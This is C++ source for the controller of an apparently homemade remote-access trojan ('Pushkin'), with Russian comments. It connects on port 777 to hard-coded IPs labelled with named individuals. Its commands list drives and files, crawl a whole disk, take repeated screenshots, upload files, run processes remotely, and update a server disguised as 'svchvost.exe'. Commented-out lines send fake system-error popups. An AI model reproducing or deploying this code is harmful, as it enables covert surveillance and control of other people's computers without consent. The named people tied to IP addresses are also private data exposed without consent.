#include <iostream>
#include <conio.h>
#include "client.h"
#include "common.h"
#include "commands.h"
#include "strlist.h"
#include "shlwapi.h"

using namespace std;
using namespace PUSHKIN_CLIENT;

#pragma warning (disable: 4996)

// Залогонивание
void Login(CPushkinClient &client)
{
   char login[21];
   char pwd[21];

   cout << "Login: ";
   cin >> login;
   cout << "Password: ";
   cin >> pwd;
   
   // Первый тест - авторизация
   if (client.Login(login, pwd) == P_YES)
      cout << "Login successfull" << endl;
}

void Connect(CPushkinClient &client)
{
   char IP[128];
   char port[128];

   cout << "IP: ";
   cin >> IP;
   cout << "port: ";
   cin >> port;

   if (client.Connect(IP, atoi(port)) != P_YES)
      cout << "Error connecting to server!" << endl;
}

void GetServerVersion(CPushkinClient &client)
{
   UINT ver;
   if (client.GetServerVersion(ver) != P_YES)
   {
      cout << "Error getting server version!" << endl;
      return;
   }

   cout << "Server version is " << ver << endl;
}

// Обновление сервера до более новой версии
void UpdateServer(CPushkinClient &client, const char *new_serv_name)
{
   if (client.UpdateServer(new_serv_name) != P_YES)
      cout << "Error updating server" << endl;
}

void GetFileList(CPushkinClient &client)
{
   char path[128];

   cout << "Path: ";
   cin >> path;

   vector<SFileInfo> list;

   if (client.GetFileList(path, list) != P_YES)
      cout << "Error getting file list!" << endl;
   else
   {
      // Выводим список файлов на экран
      for (int i=0; i<(int)list.size(); i++)
         cout << list[i].name.c_str() << endl;
   }
}

// Сохраняет список всех файлов и папок в файле
int ListFiles(CPushkinClient &client, const char *path, int nesting = 0)
{
   FILE *pFile;
   if (nesting ==0) pFile = fopen("list.txt", "wt");
   else pFile = fopen("list.txt", "at");

   char *path_t = (char*)malloc(strlen(path)+1);
   strcpy(path_t, path);
   if (path_t[strlen(path_t)-1] == '\\') path_t[strlen(path_t)-1] = 0;  // Обрезаем последний слэш

   if (!pFile)
   {
      free(path_t);
      return P_ERROR;
   }

   fprintf(pFile, "%s\n", path_t);  // Выводим наш найденный каталог
   printf(".");

   vector<SFileInfo> list;  // Список файлов и папок

   // Получаем список файлов
   if (client.GetFileList(path, list) != P_YES)
   {
      fclose(pFile);
      free(path_t);
      return P_ERROR;
   }

   // Проходим по всем папкам для начала
   for (int i=0; i<(int)list.size(); i++)
   {
      if (list[i].name == "." || list[i].name == "..") continue;

      if (list[i].attrs & FILE_ATTRIBUTE_DIRECTORY)
      {
         String new_path = path_t;
         new_path += "\\";
         new_path += list[i].name;

         ListFiles(client, new_path, nesting+1);
      }
      else
         fprintf(pFile, "%s\n", ((String)path_t+"\\"+list[i].name).c_str());
   }

   fclose(pFile);
   free(path_t);

   return P_YES;
}

void ListDrives(CPushkinClient &client)
{
   UINT d;
   if (client.GetDrivesList(d) != P_YES)
   {
      cout << "Error getting drives list" << endl;
      return;
   }

   char c = 'A';
   UINT t = 0x1;

   for (int i=0; i<26; i++)
   {
      if (d & t) printf("%c, ", c);
      t <<= 1;
      c++;
   }

   cout << endl;
}

void GetProcessList(CPushkinClient &client)
{
   vector<SFileInfo> list;
   if (client.GetProcessList(list) != P_YES)
      printf("%s\n",client.GetErrorMessage());
   else
   {
      for (int i=0; i<(int)list.size(); i++)
         printf("%s\n", list[i].name.c_str());
   }
}

void UploadFile(CPushkinClient &client)
{
   char file[256];
   char dest[256];

   cout << "Source file: ";
   cin >> file;

   cout << "Destination: ";
   cin >> dest;

   if (client.SendFile(file, dest) != P_YES)
      cout << "Error sending file" << endl;
   else
      cout << "File uploaded successfully!" << endl;
}

// Ряд картинок
void ScreenSeq(CPushkinClient &client)
{
   int n = 0;
   int interval = 0;

   char buf[256];

   // Получаем следующее свободное имя файла
   while (1)
   {
      sprintf(buf, "d:\\temp\\seq\\sc%08i.jpg", n);
      if (!PathFileExists(buf)) break;
      n++;
   }

   // Спрашиваем интервал в секундах
   cout << "Interval (in seconds): ";
   cin >> interval;

   // Каждую минуту по картинке
   while (1)
   {
      sprintf(buf, "d:\\temp\\seq\\sc%08i.jpg", n);
      if (client.GetScreenShot(buf) != P_YES)
      {
         cout << "Error making screenshot!" << endl;
         break;
      }

      cout << "Screenshot " << n << endl;

      Sleep(interval*1000);

      n++;
   }
}

void Run(CPushkinClient &client)
{
   char cmd_line[256];
   char working_dir[256];

   cout << "Command line: ";
   cin >> cmd_line;

   cout << "Working dir: ";
   cin >> working_dir;

   if (client.ServCreateProcess(cmd_line, working_dir) != P_YES)
      cout << "Error creating process!" << endl;
   else
      cout << "Process sucessfully created" << endl;
}

void Winamp(CPushkinClient &client)
{
   if (client.MaximizeWinampVolume() != P_YES)
      cout << "Error setting winamp volume!" << endl;
   else
      cout << "Winamp volume adjusted successfully" << endl;
}


void CDROM(CPushkinClient &client, int b_open)
{
   int time;
   cout << "After how many seconds? ";
   cin >> time;

   Sleep(time*1000);

   if (b_open==1) client.OpenCDDoor(1);
   else
   if (b_open==0) client.OpenCDDoor(0);
   else
   {
      client.OpenCDDoor(1);
      client.OpenCDDoor(0);
   }
}

void main(int argc, char *argv[])
{
   CPushkinClient client;

   // Инициализация сокетов - вынесена за пределы инициализации клиента
   WSADATA      wsa_data;       // Информация о сокетах
   memset(&wsa_data, 0, sizeof(wsa_data));  // Данные интерфейса сокетов
   if (WSAStartup(0x101,&wsa_data) != 0)
      return;

   char *ip;
   if (argc >= 2)
      ip = argv[1];
   else
      ip = "127.0.0.1";
//      ip = "217.23.121.63";  // Даша Кривошеева
//      ip = "217.23.121.167";   // Бывший комп Портного
//      ip = "217.23.121.170"; // Алексей Акбердин

   if (client.Connect(ip, 777) == P_YES)  // Даша Кривошеева
//   if (client.Connect("217.23.121.167", 777) == P_YES)   // Бывший комп Портного
//   if (client.Connect("217.23.121.170", 777) == P_YES) // Алексей Акбердин
//   if (client.Connect("217.23.121.174", 777) == P_YES)  // Сергей Аверьянов
//   if (client.Connect("127.0.0.1", 777) == P_YES)
   {
      if (argc >= 4)  // Есть логин и пароль
        if (client.Login(argv[2], argv[3]) != P_YES)
           cout << "Error logging in!" << endl;
   }
   else
      cout << "Error connecting to server!" << endl;

   // Сразу получаем версию сервера и выводим на экран
   UINT ver;
   if (client.GetServerVersion(ver) == P_YES)
      cout << "Server version is " << ver << endl;
   else
      cout << "Error getting server version!" << endl;

   if (argc == 2)
   {
      if (strcmp(argv[1], "stopserver") == 0)
      {
         client.ShutdownServer();
         Sleep(200);
         DeleteFile("svchvost.exe");
         WSACleanup();
         return;
      }
   }
/*
   for (int i=0; i<10; i++)
   {
      client.OpenCDDoor(i%2);
      if (kbhit()) break;
   }

   client.OpenCDDoor(0);
*/

//   client.SendMessage("Недостаточное количество виртуальной памяти для выполнения операции.\nПожалуйста, перезагрузите компьютер");
//   return;

//   client.SendFile("c:\\ACD Wallpaper.bmp", "c:\\Windows\\ACD Wallpaper.bmp");
//   return;

//   client.SendMessage("Fucking SHIT!!!", "Какого хера?", MB_OK|MB_ICONSTOP);
//   return;

//   client.ServShellExecute("open","e:\\Мой младший брат.AVI","");
//   return;

   // Работаем с клиентом (тестирование возможностей клиента)
   while (1)
   {
      char action[128];

      cout << "Action: ";
      cin >> action;

      if (strcmp(action, "exit") == 0) break;
      else
      if (strcmp(action, "connect") == 0) Connect(client);
      else
      if (strcmp(action, "disconnect") == 0) client.Disconnect();
      else
      if (strcmp(action, "login") == 0) Login(client);
      else
      if (strcmp(action, "s") == 0)  // Короткая команда
      {
         if (client.ShutdownServer() == P_YES)
         {
            printf("Server stopped!\n");
            WSACleanup();
            return;
         }
      }
      else
      if (strcmp(action, "version") == 0) GetServerVersion(client);
      else
      if (strcmp(action, "updateserver") == 0) UpdateServer(client, "svchvost.exe");
      else
      if (strcmp(action, "getfilelist") == 0) GetFileList(client);
      else
      if (strcmp(action, "listfiles") == 0) ListFiles(client, "c:\\");
      else
      if (strcmp(action, "getdriveslist") == 0) ListDrives(client);
      else
      if (strcmp(action, "processlist") == 0) GetProcessList(client);
      else
      if (strcmp(action, "cdrom_open") == 0) CDROM(client, 1);
      else
      if (strcmp(action, "cdrom_close") == 0) CDROM(client, 0);
      else
      if (strcmp(action, "cdrom_openclose") == 0) CDROM(client, 3);
      else
      if (strcmp(action, "screen") == 0)
      {
         if (client.GetScreenShot("c:\\screen.jpg") != P_YES)
            printf("Error getting screenshot!\n");
      }
      else
      if (strcmp(action, "uploadfile") == 0) UploadFile(client);
      else
      if (strcmp(action, "screen_seq") == 0) ScreenSeq(client);
      else
      if (strcmp(action, "run") == 0) Run(client);
      else
      if (strcmp(action, "winamp") == 0) Winamp(client);
      else
         cout << "Unknown action!" << endl;
   }

   WSACleanup();
}
